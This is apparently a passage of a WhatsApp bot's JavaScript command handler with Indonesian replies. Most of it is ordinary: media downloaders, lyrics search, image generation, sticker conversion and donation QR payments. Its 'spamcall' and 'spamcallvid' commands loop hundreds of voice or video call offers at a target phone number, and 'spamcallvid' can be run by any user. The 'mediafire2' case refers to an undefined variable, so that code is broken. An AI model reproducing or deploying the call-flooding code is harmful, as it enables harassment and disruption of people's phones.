 + `🎤 *Channel:* ${song.channel?.name || 'Unknown'}\n`
 + `🔗 *Video:* ${song.videoUrl}\n`
 + `🎧 *Download:* ${song.download}`;
 const videoId = song.videoUrl.includes('v=') ? song.videoUrl.split('v=')[1].split('&')[0] : null;
 const thumbnailUrl = videoId ? `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg` : null;
 await conn.sendMessage(m.chat, {
 text: caption,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: song.title,
 body: `Music Player`,
 mediaType: 1,
 thumbnailUrl: thumbnailUrl,
 sourceUrl: song.videoUrl
 }
 }
 }, { quoted: m });
 const sanitizedTitle = song.title.replace(/[^\w\s-]/gi, '_').substring(0, 50);
 let audioPath = path.join(__dirname, `temp_${Date.now()}_${sanitizedTitle}.mp3`);
 try {
 const response = await axios({
 method: 'get',
 url: song.download,
 responseType: 'arraybuffer',
 timeout: 60000,
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 });
 if (!response.data || response.data.length === 0) {
 throw new Error('Empty response data');
 }
 fs.writeFileSync(audioPath, Buffer.from(response.data));
 try {
 await conn.sendMessage(m.chat, {
 audio: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });
 } catch (audioSendError) {
 await conn.sendMessage(m.chat, {
 document: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });
 }
 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } catch (downloadError) {
 try {
 const alternativeUrl = `https://api.akuari.my.id/downloader/youtube?link=${song.videoUrl}`;
 const altResponse = await axios.get(alternativeUrl);
 if (altResponse.data && altResponse.data.mp3) {
 const audioResponse = await axios({
 method: 'get',
 url: altResponse.data.mp3,
 responseType: 'arraybuffer',
 timeout: 60000
 });
 audioPath = path.join(__dirname, `temp_alt_${Date.now()}_${sanitizedTitle}.mp3`);
 fs.writeFileSync(audioPath, Buffer.from(audioResponse.data));
 await conn.sendMessage(m.chat, {
 document: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });

 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } else {
 throw new Error('Alternative API failed');
 }
 } catch (altError) {
 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 m.reply('Gagal mengunduh audio. Coba lagi nanti.');
 await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 }
 }
 } catch (error) {
 m.reply('Terjadi kesalahan saat mencari atau memproses lagu.');
 await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 }
 break
 case 'hiitwixtor': case 'twixtor': {
  if (!text) return m.reply('Contoh: hiitwixtor Gojo');
  const axios = require("axios");
  const cheerio = require("cheerio");
  const search = async (query) => {
    try {
      const url = `https://hiitwixtor.com/?s=${encodeURIComponent(query)}`;
      const { data } = await axios.get(url);
      const $ = cheerio.load(data);
      let result = [];
      $('.post-details').each((_, el) => {
        const title = $(el).find('h2').text().trim();
        const link = $(el).find('h2>a').attr('href');
        const image = $('a.post-thumb').find('img').attr('src');
        const coment = $(el).find('span.meta-comment.tie-icon.meta-item.fa-before').text().trim();
        const fire = $(el).find('span.meta-views.meta-item.very-hot').text().trim();
        result.push({ title, link, image, coment, fire });
      });
      return result;
    } catch (e) {
      return [];
    }
  };
  let res = await search(text);
  if (!res.length) return m.reply('Tidak ditemukan.');
  let teks = `*Hasil pencarian Hiitwixtor: ${text}*\n\n`;
  for (let i = 0; i < res.length; i++) {
    teks += `*${i + 1}. ${res[i].title}*\n`;
    teks += `🔥 Views: ${res[i].fire} | 💬 Comments: ${res[i].coment}\n`;
    teks += `${res[i].link}\n\n`;
  }
  m.reply(teks);
}
  break
 case "ytmp4-v2":
case "ytvideo-v2": {
 if (!q) return m.reply(`Example: ${prefix + command} https://youtube.com/watch?v=CVLeZpg6Kzk 144/240/360/480/720/1080`);
 const argsc = q.split(' ');
 const url = argsc[0];
 const availableResolutions = ['144', '240', '360', '480', '720', '1080'];
 let quality = argsc[1] && availableResolutions.includes(argsc[1]) ? argsc[1] : '480';
 if (!url.match(/^(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)) {
 return m.reply(`Please provide a valid YouTube URL\n\nAvailable resolutions: ${availableResolutions.join(', ')}`);
 }
 m.reply(mess.wait);
 try {
 const apiUrl = `https://api.hiuraa.my.id/downloader/savetube?url=${encodeURIComponent(url)}&format=${quality}`;
 const response = await fetch(apiUrl);
 const data = await response.json();
 if (!data.status || !data.result) {
 return m.reply('Failed to download the video');
 }
 const { title, duration, thumbnail, download } = data.result;
 await conn.sendMessage(m.chat, {
 image: { url: thumbnail },
 caption: `*${title}*\n*${quality}p* | *${duration}*`
 }, { quoted: m });
 
 await conn.sendMessage(m.chat, {
 video: { url: download },
 mimetype: 'video/mp4'
 }, { quoted: m });
 
 } catch (error) {
 console.error('Error downloading YouTube video:', error);
 m.reply('An error occurred while downloading the video');
 }
 }
 break
 
case 'ytmp4': 
case 'ytvideo': 
case 'ytv': {
 if (!text) return m.reply(`Gunakan: ${prefix + command} <url> [resolusi]`); 
 let url = argsbiyuoffc[0]; 
 let resolution = argsbiyuoffc[1] && !isNaN(argsbiyuoffc[1]) ? argsbiyuoffc[1] : "720"; 
 try { 
 await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 let info = await getVideoInfo(url);
 if (!info || !info.status) return m.reply('❌ Gagal mendapatkan informasi video.');
 await conn.sendMessage(m.chat, { react: { text: '📥', key: m.key } });
 let video = await downloadVideo(url, resolution);
 if (!video.status || !video.downloadUrl) return m.reply('❌ Gagal mendapatkan file video.');
 let captionInfo = `📹 *${info.title}*\n👤 *Creator:* ${info.creator}\n⏳ *Durasi:* ${info.duration} detik\n📡 *Sumber:* ${video.source}\n🎥 *Resolusi:* ${resolution}p\n🔗 *URL:* ${info.url}`;
 await conn.sendMessage(m.chat, {
 image: { url: info.thumbnail },
 caption: captionInfo
 }, { quoted: m });
 await conn.sendMessage(m.chat, { react: { text: '📤', key: m.key } });
 let fileSize = await getFileSizeFromUrl(video.downloadUrl);
 let captionMedia = `📹 *${info.title}*\n👤 *${info.creator}*\n📡 *Sumber:* ${video.source}`;
 if (fileSize > 15 * 1024 * 1024) {
 await conn.sendMessage(m.chat, { 
 document: { url: video.downloadUrl },
 mimetype: 'video/mp4',
 fileName: `${info.title}.mp4`,
 caption: captionMedia
 }, { quoted: m });
 } else {
 await conn.sendMessage(m.chat, { 
 video: { url: video.downloadUrl },
 caption: captionMedia,
 fileName: `${info.title}.mp4`
 }, { quoted: m });
 }
 await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) { 
 console.error(err); 
 m.reply('❌ Terjadi kesalahan.'); 
 } 
} 
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "block")
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'mediafire2': case 'mf2': {
  if (!q) return m.reply(`Kirim link Mediafire-nya!\n\nContoh: ${prefix + command} https://www.mediafire.com/file/xxx`)

  try {
    let res = await fetch(`https://api.vreden.my.id/api/mediafiredl?url=${q}`)
    let data = await res.json()
    if (!data.result || !data.result[0].status) return m.reply('Gagal mengambil data Mediafire.')
    let file = data.result[0]
    let { nama, size, link } = ffil
    let ext = nama.split('.').pop().toLowerCase()
    let mimeTypes = {
      zip: 'application/zip',
      pdf: 'application/pdf',
      mp4: 'video/mp4',
      mp3: 'audio/mpeg',
      apk: 'application/vnd.android.package-archive',
      docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
      txt: 'text/plain',
      png: 'image/png',
      jpg: 'image/jpeg',
      jpeg: 'image/jpeg',
    }
    let mime = mimeTypes[ext] || 'application/octet-stream'
    let caption = `*MEDIAFIRE DOWNLOADER*\n\n`
    caption += `*Nama:* ${nama}\n`
    caption += `*Ukuran:* ${size}\n`
    caption += `*Tipe:* ${mime}\n`
    caption += `*Server:* ${file.server}\n`
    caption += `*Link:* ${link}\n\n`
    caption += `_Jika file tidak bisa dibuka langsung, silakan buka dari File Manager._`
    await conn.sendMessage(m.chat, {
      document: { url: link },
      fileName: nama,
      mimetype: mime,
      caption
    }, { quoted: m })
  } catch (e) {
    console.log(e)
    m.reply('Terjadi kesalahan saat mengambil file, coba lagi nanti.')
  }
}
  break
  case 'mediafire3': case 'mf3': {
  if (!q) return m.reply('Masukkan URL Mediafire!\nContoh: mediafire3 https://www.mediafire.com/file/xxxxxx');
  const res = await fetch(`https://fastrestapis.fasturl.cloud/downup/mediafiredown?url=${encodeURIComponent(q)}`);
  if (!res.ok) return m.reply('Gagal mengambil data dari Mediafire.');
  const data = await res.json();
  if (data.status !== 200 || !data.result?.download) {
    return m.reply('Gagal mengambil link download.');
  }
  const {
    filename,
    size,
    mimetype,
    owner,
    download,
    created
  } = data.result;
  const caption = `*MEDIAFIRE DOWNLOADER*\n\n` +
    `*Nama File:* ${filename}\n` +
    `*Ukuran:* ${size}\n` +
    `*Tipe:* ${mimetype}\n` +
    `*Owner:* ${owner}\n` +
    `*Upload:* ${created}\n\n` +
    `Mengirim file, mohon tunggu...`;
  await m.reply(caption);
  try {
    const response = await fetch(download);
    const buffer = await response.buffer();
    conn.sendMessage(m.chat, {
      document: buffer,
      fileName: filename,
      mimetype: mimetype,
      caption: `Berikut file dari Mediafire:\n\n${filename} (${size})`
    }, { quoted: m });
  } catch (err) {
    m.reply('Gagal mengunduh dan mengirim file.');
    console.error(err);
  }
}
  break
case 'mediafire': case 'mf': {
  if (!q) return m.reply('Masukkan link Mediafire-nya!\nContoh: .mediafire https://www.mediafire.com/file/xxx')
  m.reply('Tunggu sebentar, sedang diproses...')

  try {
    const res = await fetch(`https://api.siputzx.my.id/api/d/mediafire?url=${encodeURIComponent(q)}`)
    const json = await res.json()
    if (!json.status) return m.reply('Gagal mengambil data dari Mediafire.')
    const {
      fileName,
      fileSize,
      fileType,
      mimeType,
      fileExtension,
      uploadDate,
      compatibility,
      description,
      downloadLink
    } = json.data
    let caption = `*「 MEDIAFIRE DOWNLOADER 」*\n\n`
    caption += `*Nama File:* ${fileName}\n`
    caption += `*Ukuran:* ${fileSize}\n`
    caption += `*Tipe:* ${fileType} (${fileExtension})\n`
    caption += `*Mime:* ${mimeType}\n`
    caption += `*Kompatibilitas:* ${compatibility}\n`
    caption += `*Upload Date:* ${uploadDate}\n`
    caption += `*Deskripsi:* ${description}`
    await conn.sendMessage(m.chat, {
      document: { url: downloadLink },
      fileName,
      mimetype: mimeType,
      caption
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses link.')
  }
  }
  break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'lirik': case 'lyrics': case 'searchlirik':
 if (!q) return m.reply('Masukkan judul lagu!\nContoh: .lirik someone like you');
 m.reply('Sedang mencari lirik...');
 try {
 const response = await fetch(`https://r.jina.ai/https://www.google.com/search?q=lirik+lagu+${encodeURIComponent(q)}&hl=en`, {
 headers: {
 'x-return-format': 'html',
 'x-engine': 'cf-browser-rendering',
 }
 });
 const cheerio = require('cheerio');
 const text = await response.text();
 const $ = cheerio.load(text);
 const lirik = [];
 const output = [];
 const result = {};
 $('div.PZPZlf').each((i, e) => {
 const penemu = $(e).find('div[jsname="U8S5sf"]').text().trim();
 if (!penemu) output.push($(e).text().trim());
 });
 $('div[jsname="U8S5sf"]').each((i, el) => {
 let out = '';
 $(el).find('span[jsname="YS01Ge"]').each((j, span) => {
 out += $(span).text() + '\n';
 });
 lirik.push(out.trim());
 });
 result.lyrics = lirik.join('\n\n');
 result.title = output.shift();
 result.subtitle = output.shift();
 result.platform = output.filter(_ => !_.includes(':'));
 output.forEach(_ => {
 if (_.includes(':')) {
 const [name, value] = _.split(':');
 result[name.toLowerCase()] = value.trim();
 }
 });
 if (!result.lyrics) return m.reply('Lirik tidak ditemukan.');
 let teks = `🎵 *${result.title || 'Judul Tidak Diketahui'}* 🎵\n`;
 teks += result.subtitle ? `_${result.subtitle}_\n\n` : '\n';
 teks += result.lyrics;
 m.reply(teks);
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan saat mengambil lirik.');
 }
 break
 
 case "imgbing": case "bingimg": {
    if (!argsbiyuoffc.length) return m.reply("Masukkan prompt gambar!\nContoh: imgbing mobil sport merah");
    let query = encodeURIComponent(argsbiyuoffc.join(" "));
    let url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;
    try {
        await conn.sendMessage(from, { react: { text: "⏳", key: m.key } });
        let response = await fetch(url);
        let data = await response.json();
        if (data.status !== 200 || !data.data.result.length) {
            return m.reply("Gambar tidak ditemukan!");
        }
        for (let img of data.data.result) {
            await conn.sendMessage(from, { image: { url: img }, caption: "Maaf Jika Tidak Sesuai 😌" }, { quoted: m });
        }
        await conn.sendMessage(from, { react: { text: "✅", key: m.key } });
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat mengambil gambar.");
    }
}
    break
    
case 'toimg': {
  if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp')
  const quoted = m.quoted ? m.quoted : m
  const mime = (quoted.msg || quoted).mimetype || ''
  if (!quoted) return m.reply('Reply gambar stickernya dulu!')
  if (!/webp/.test(mime)) return m.reply('Yang kamu reply bukan sticker!')
  const isAnimated = quoted?.isAnimated
  if (!isAnimated) {
    let img = await quoted.download()
    await conn.sendMessage(m.chat, { image: img, jpegThumbnail: img }, { quoted: m })
  } else {
    await m.reply('_In progress, please wait..._')
    let img = await quoted.download()
    const webpToImage = (bufferImage) => new Promise((resolve, reject) => {
      const rand = Math.floor(Math.random() * 1000000 + 1)
      const base = `./tmp/${rand}`
      const pathWebp = `${base}.webp`
      const pathImg = `${base}.jpg`
      try {
        fs.writeFileSync(pathWebp, bufferImage)
        exec(`convert ${pathWebp} ${pathImg}`, (err) => {
          if (err || !fs.existsSync(pathImg)) {
            fs.unlinkSync(pathWebp)
            return reject('Gagal konversi ke gambar!')
          }
          const img = fs.readFileSync(pathImg)
          fs.unlinkSync(pathWebp)
          fs.unlinkSync(pathImg)
          resolve(img)
        })
      } catch (e) {
        reject(e)
      }
    })

    try {
      let out = await webpToImage(img)
      await conn.sendMessage(
        m.chat,
        {
          image: out,
          jpegThumbnail: out
        },
        { quoted: m }
      )
    } catch (e) {
      await m.reply(`Gagal konversi: ${e}`)
    }
  }
}
  break

case 'donate': case 'donasi': {
    if (m.isGroup) return m.reply(mess.group)
    
    let db_saweria = [];
    try {
        const data = fs.readFileSync("./source/saweria.json", 'utf8');
        db_saweria = JSON.parse(data);
        if (!Array.isArray(db_saweria) || db_saweria.length === 0) {
            return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
        }
    } catch (error) {
        return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
    }
    
    if (!q) return m.reply(`Contoh: ${prefix+command} 10000,Donasi untuk support`);
    
    const parts = q.split(',');
    if (parts.length < 1) return m.reply(`Contoh: ${prefix+command} 10000,Donasi untuk support`);
    
    const amount = parseInt(parts[0].trim());
    const message = parts.length > 1 ? parts.slice(1).join(',').trim() : 'Donasi';
    
    if (isNaN(amount) || amount < 1000) {
        return m.reply(`Jumlah donasi minimal 1000 rupiah.`);
    }
    
    try {
        await m.reply("Sedang membuat QR code pembayaran...");
        let Pay = new Saweria2(db_saweria[0]); 
        let res = await Pay.createPayment(amount, message);
        
        if (!res.status) {
            return m.reply(`Terjadi kesalahan saat membuat pembayaran:\n${res.msg}`);
        }
        
        let db_payments = [];
        try {
            const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
            db_payments = JSON.parse(paymentsData);
            if (!Array.isArray(db_payments)) {
                db_payments = [];
            }
        } catch (error) {
            db_payments = [];
        }
        
        db_payments.push({
            id: res.data.id,
            amount: res.data.amount,
            message: res.data.message,
            created_at: res.data.created_at,
            expired_at: res.data.expired_at,
            status: 'pending'
        });
        
        fs.writeFileSync("./source/payments.json", JSON.stringify(db_payments, null, 2), 'utf8');
        
        const buffer = Buffer.from(res.data.qr_image.split(',')[1], 'base64');
        await conn.sendMessage(m.chat, {
            image: buffer,
            caption: `🧾 *PAYMENT QR CODE*\n\n💰 *Jumlah:* Rp${res.data.amount.toLocaleString('id-ID')}\n💬 *Pesan:* ${res.data.message}\n⏱️ *Dibuat:* ${res.data.created_at}\n⏳ *Kadaluarsa:* ${res.data.expired_at}\n🆔 *ID:* ${res.data.id}\n\nSilakan scan QR Code untuk melakukan pembayaran.\nBot akan otomatis mengirimkan notifikasi jika pembayaran berhasil.`
        });
       
        if (!global.paymentIntervals) global.paymentIntervals = {};
        const intervalId = setInterval(async () => {
            try {
                let Pay = new Saweria2(db_saweria[0]);
                let statusRes = await Pay.checkPayment(res.data.id);
                
                if (statusRes.status) {

                    let updatedPayments = [];
                    try {
                        const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
                        updatedPayments = JSON.parse(paymentsData);
                        
                        if (Array.isArray(updatedPayments)) {
                            updatedPayments = updatedPayments.map(payment => {
                                if (payment.id === res.data.id) {
                                    payment.status = 'success';
                                }
                                return payment;
                            });
                            
                            fs.writeFileSync("./source/payments.json", JSON.stringify(updatedPayments, null, 2), 'utf8');
                        }
                    } catch (error) {
                        console.error('Error updating payment status:', error);
                    }
                    
                    await conn.sendMessage(m.chat, {
                        text: `✅ *PEMBAYARAN BERHASIL*\n\n*ID:* ${res.data.id}\n*Status:* Lunas\n\nTerima kasih atas donasi Anda!`
                    });
                    
                    clearInterval(global.paymentIntervals[res.data.id]);
                    delete global.paymentIntervals[res.data.id];
                }
            } catch (error) {
                console.error('Error checking payment:', error);
            }
        }, 30000); 
        
        global.paymentIntervals[res.data.id] = intervalId;
       
        setTimeout(() => {
            if (global.paymentIntervals[res.data.id]) {
                clearInterval(global.paymentIntervals[res.data.id]);
                delete global.paymentIntervals[res.data.id];
            }
        }, 10 * 60 * 1000);
        
    } catch (error) {
        console.error('Payment error:', error);
        return m.reply('Terjadi kesalahan saat membuat pembayaran. Silakan coba lagi.');
    }
}
break

case "autotranslate": {
    if (!isOwner) return m.reply(msg.owner);
  const user = m.sender
  const subcmd = argsbiyuoffc[0]
  const value = argsbiyuoffc[1]
  if (!subcmd) return m.reply(`*Autotranslate Menu:*
• autotranslate on
• autotranslate off
• autotranslate status
• autotranslate set <kode_bahasa>\n
Contoh kode: en (Inggris), id (Indonesia), ja (Jepang), ar (Arab), etc.`)
  switch (subcmd.toLowerCase()) {
    case "on":
      global.autoTranslate[user] = {
        ...global.autoTranslate[user],
        status: true,
        lang: global.autoTranslate[user]?.lang || "id"
      }
      m.reply(`✅ Autotranslate *diaktifkan!*\nTarget: *${global.autoTranslate[user].lang.toUpperCase()}*`)
      break
    case "off":
      global.autoTranslate[user] = {
        ...global.autoTranslate[user],
        status: false
      }
      m.reply(`❌ Autotranslate *dimatikan.*`)
      break
    case "status":
      const isOn = global.autoTranslate[user]?.status
      const lang = global.autoTranslate[user]?.lang || "id"
      m.reply(`*Status Autotranslate:*
• Aktif: *${isOn ? "Ya" : "Tidak"}*
• Bahasa: *${lang.toUpperCase()}*`)
      break
    case "set":
      if (!value) return m.reply(`Contoh: autotranslate set en`)
      global.autoTranslate[user] = {
        ...global.autoTranslate[user],
        lang: value.toLowerCase()
      }
      m.reply(`✏️ Bahasa auto translate diatur ke *${value.toUpperCase()}*`)
      break
    default:
      m.reply(`Subcommand tidak dikenal.\nGunakan: on, off, status, set <lang>`)
  }
}
break

case "autoreactionch":
case "autoreactch": {
    if (!isOwner) return m.reply(msg.owner);
    if (!text) return m.reply("Contoh:\n.autoreactionch https://whatsapp.com/channel/xxx/123 ❤️biyu\n.autoreactionch off https://whatsapp.com/channel/xxx/123\n.autoreactionch offall");
    if (text.toLowerCase() === 'offall') {
        global.autoreactDB = {};
        saveAutoreact(global.autoreactDB);
        if (autoreactInterval) {
            clearInterval(autoreactInterval);
            autoreactInterval = null;
        }
        return m.reply("❌ Semua auto reaction channel berhasil dimatikan.");
    }
    if (text.toLowerCase().startsWith('off ')) {
        const link = text.split(' ')[1];
        if (!link || !link.includes("https://whatsapp.com/channel/")) {
            return m.reply("Link tidak valid!\nContoh: .autoreactionch off https://whatsapp.com/channel/xxx/idpesan");
        }
        const parts = link.split('/');
        const channelId = parts[4];
        if (!channelId || !global.autoreactDB[channelId]) return m.reply("Auto reaction tidak ditemukan untuk channel ini.");
        delete global.autoreactDB[channelId];
        saveAutoreact(global.autoreactDB);
        if (Object.keys(global.autoreactDB).length === 0 && autoreactInterval) {
            clearInterval(autoreactInterval);
            autoreactInterval = null;
        }
        return m.reply(`❌ Auto reaction untuk channel ${channelId} berhasil dimatikan.`);
    }
    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };
    const [mainText] = text.split('|');
    const biyun = mainText.trim().split(" ");
    const link = biyun[0];
    if (!link.includes("https://whatsapp.com/channel/")) {
        return m.reply("Link tidak valid!\nContoh: .autoreactionch https://whatsapp.com/channel/xxx/idpesan ❤️biyu");
    }
    const parts = link.split('/');
    const channelId = parts[4];
    const rawMessageId = parseInt(parts[5]);
    if (!channelId || isNaN(rawMessageId)) return m.reply("Link tidak lengkap!");
    let emojiText = biyun.slice(1).join(' ').trim();
    if (!emojiText) return m.reply("Masukkan emoji atau teks untuk direaksikan.");
    const emoji = emojiText.toLowerCase().split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');
    global.autoreactDB[channelId] = {
        lastId: rawMessageId,
        emoji: emoji
    };
    saveAutoreact(global.autoreactDB);
    m.reply(`✅ Berhasil mengatur auto reaction dengan emoji *${emoji}* pada channel ${channelId} dimulai dari pesan ID ${rawMessageId}.`);
    startAutoreactLoop(conn);
}
break

case 'cekdonasi': case 'cekdonate': {
    if (m.isGroup) return m.reply(mess.group)
    
    let db_saweria = [];
    try {
        const data = fs.readFileSync("./source/saweria.json", 'utf8');
        db_saweria = JSON.parse(data);
        if (!Array.isArray(db_saweria) || db_saweria.length === 0) {
            return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
        }
    } catch (error) {
        return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
    }
    
    if (!q) return m.reply(`Contoh: ${prefix+command} payment_id`);
    const payment_id = q.trim();
    
    try {
        await m.reply("Sedang memeriksa status pembayaran...");
        let Pay = new Saweria2(db_saweria[0]); 
        let res = await Pay.checkPayment(payment_id);
        
        let db_payments = [];
        let paymentFound = false;
        
        try {
            const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
            db_payments = JSON.parse(paymentsData);
            
            if (Array.isArray(db_payments)) {
                db_payments = db_payments.map(payment => {
                    if (payment.id === payment_id) {
                        paymentFound = true;
                        payment.status = res.status ? 'success' : 'pending';
                    }
                    return payment;
                });
                
                fs.writeFileSync("./source/payments.json", JSON.stringify(db_payments, null, 2), 'utf8');
            }
        } catch (error) {
            console.error('Error updating payment status:', error);
        }
        
        if (res.status) {
            return m.reply(`✅ *PEMBAYARAN BERHASIL*\n\n*ID:* ${payment_id}\n*Status:* Lunas\n\nTerima kasih atas donasi Anda!`);
        } else {
            const statusMsg = paymentFound 
                ? `⏳ *PEMBAYARAN PENDING*\n\n*ID:* ${payment_id}\n*Status:* Belum dibayar\n\nSilakan selesaikan pembayaran.`
                : `❌ *PEMBAYARAN TIDAK DITEMUKAN*\n\n*ID:* ${payment_id}\n*Pesan:* ${res.msg}`;
            
            return m.reply(statusMsg);
        }
    } catch (error) {
        console.error('Payment check error:', error);
        return m.reply('Terjadi kesalahan saat memeriksa pembayaran. Silakan coba lagi.');
    }
}
break

case 'autohari': {
  if (!m.isGroup) return m.reply('Fitur ini cuma bisa dipakai di grup!')
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!autohariDB[m.chat]) autohariDB[m.chat] = {}
  const argsLower = q.toLowerCase().split(' ')
  const day = argsLower[0]
  const state = argsLower[1]
  const validDays = ['senin', 'selasa', 'rabu', 'kamis', 'jumat', 'sabtu', 'minggu']
  if (day === 'all') {
    if (state !== 'on' && state !== 'off') {
      return m.reply(`Contoh:\n*${prefix}autohari all on*\n*${prefix}autohari all off*`)
    }
    for (let d of validDays) {
      autohariDB[m.chat][d] = { active: state === 'on' }
    }
    saveAutohari()
    return m.reply(`${state === 'on' ? '✅ Semua hari diaktifkan!' : '❌ Semua hari dinonaktifkan!'}`)
  }
  if (!validDays.includes(day)) {
    return m.reply(`Hari yang valid: ${validDays.join(', ')} atau *all*\n\nContoh:\n*${prefix}autohari senin on*`)
  }
  if (state === 'on') {
    autohariDB[m.chat][day] = { active: true }
    saveAutohari()
    m.reply(`✅ Fitur AutoHari untuk hari ${day} telah diaktifkan!`)
  } else if (state === 'off') {
    autohariDB[m.chat][day] = { active: false }
    saveAutohari()
    m.reply(`❌ Fitur AutoHari untuk hari ${day} telah dinonaktifkan!`)
  } else {
    m.reply(`Contoh:\n*${prefix}autohari senin on*\n*${prefix}autohari selasa off*`)
  }
}
break
case 'spamcallvid': {
    if (!q) return m.reply("Example use:\n\nspamcallvid 62xxx|jumlah\nor reply/tag someone.\n\nExample:\nspamcallvid 62895640071400|1000");
    let targetNumber = q.split("|")[0];
    let jumlahSpam = q.split("|")[1] ? parseInt(q.split("|")[1]) : 500;
    let isTarget = m.mentionedJid[0] ? 
        m.mentionedJid[0] : 
        m.quoted ? 
            m.quoted.sender : 
            targetNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (isNaN(jumlahSpam) || jumlahSpam <= 0) jumlahSpam = 500; 
    m.reply(`*LOADING*-\n- \`${jumlahSpam} VID CALL\` - PROCESS SENDING, PLEASE WAIT WHILE *BOT IS STILL WORKING* > MORTAL PROCESS...`);
    await sleep(1000);
    async function sendOfferVideoCall(target) {
        try {
            await conn.offerCall(target, { video: true });
            console.log(chalk.white.bold('Success Send Offer Video Call To Target.'));
        } catch (error) {
            console.error(chalk.white.bold('Failed Send Offer Video Call To Target:'), error);
        }
    }
    for (let i = 0; i < jumlahSpam; i++) {
        await sendOfferVideoCall(isTarget);
    }
}
break
case 'spamcall': {
    if (!isCreator) return m.reply(mess.owner)
    if (!q) return m.reply("Example use:\n\nspamcall 62xxx|jumlah\nor reply/tag someone.\n\nExample:\nspamcall 62895640071400|1000");
    let targetNumber = q.split("|")[0];
    let jumlahSpam = q.split("|")[1] ? parseInt(q.split("|")[1]) : 500;
    let isTarget = m.mentionedJid[0] ? 
        m.mentionedJid[0] : 
        m.quoted ? 
            m.quoted.sender : 
            targetNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (isNaN(jumlahSpam) || jumlahSpam <= 0) jumlahSpam = 500; 
    m.reply(`*LOADING*-\n- \`${jumlahSpam} CALL\` - PROCESS SENDING, PLEASE WAIT WHILE *BOT IS STILL WORKING* > MORTAL PROCESS...`);
    await sleep(1000);
    async function sendOfferCall(target) {
        try {
            await conn.offerCall(target);
            console.log(chalk.white.bold('Success send offer call to target.'));
        } catch (error) {
            console.error(chalk.white.bold('Failed to send offer call to target:'), error);
        }
    }
    for (let i = 0; i < jumlahSpam; i++) {
        await sendOfferCall(isTarget);
    }
}
break
case 'listdonasi': case 'listdonate': {
    if (!isCreator) return m.reply(mess.owner)
    if (!isOwner) return Reply(mess.owner)

    let db_payments = [];
    try {
        const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
        db_payments = JSON.parse(paymentsData);
        
        if (!Array.isArray(db_payments) || db_payments.length === 0) {
            return m.reply(`Belum ada donasi yang tercatat.`);
        }
    } catch (error) {
        return m.reply(`Belum ada donasi yang tercatat.`);
    }
    

    let message = `*DAFTAR DONASI*\n\n`;
    
    db_payments.forEach((payment, index) => {
        message += `${index + 1}. *ID:* ${payment.id}\n`;
        message += `   💰 *Jumlah:* Rp${payment.amount.toLocaleString('id-ID')}\n`;
        message += `   💬 *Pesan:* ${payment.message}\n`;
        message += `   ⏱️ *Dibuat:* ${payment.created_at}\n`;
